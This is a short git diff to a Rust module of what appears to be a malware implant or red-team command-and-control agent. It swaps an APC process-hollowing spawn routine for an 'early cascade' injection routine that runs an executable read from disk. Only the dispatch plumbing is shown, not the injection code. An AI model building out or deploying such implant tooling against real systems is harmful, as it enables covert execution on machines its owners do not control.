@@ -1,6 +1,5 @@
 use std::{
-    fs::{self, File},
-    io::Read,
+    fs::{self},
     path::PathBuf,
 };
 
@@ -8,15 +7,23 @@ use shared::tasks::WyrmResult;
 
 use crate::{
     native::filesystem::{PathParseType, parse_path},
-    spawn::hollow_apc::spawn_sibling,
+    spawn::early_cascade::early_cascade_spawn_child,
 };
 
-pub mod hollow_apc;
+pub mod early_cascade;
+
+pub enum SpawnMethod {
+    EarlyCascade,
+}
 
 pub struct Spawn;
 
 impl Spawn {
-    pub fn spawn_sibling(path: &str, implant_working_dir: &PathBuf) -> WyrmResult<String> {
+    pub fn spawn_child(
+        path: &str,
+        implant_working_dir: &PathBuf,
+        method: SpawnMethod,
+    ) -> WyrmResult<String> {
         let path = match parse_path(path, implant_working_dir, PathParseType::File) {
             WyrmResult::Ok(p) => p,
             WyrmResult::Err(e) => {
@@ -30,6 +37,9 @@ impl Spawn {
         let Ok(buf) = fs::read(path) else {
             return WyrmResult::Err(format!("Could not read file"));
         };
-        spawn_sibling(buf)
+
+        match method {
+            SpawnMethod::EarlyCascade => early_cascade_spawn_child(buf),
+        }
     }
 }
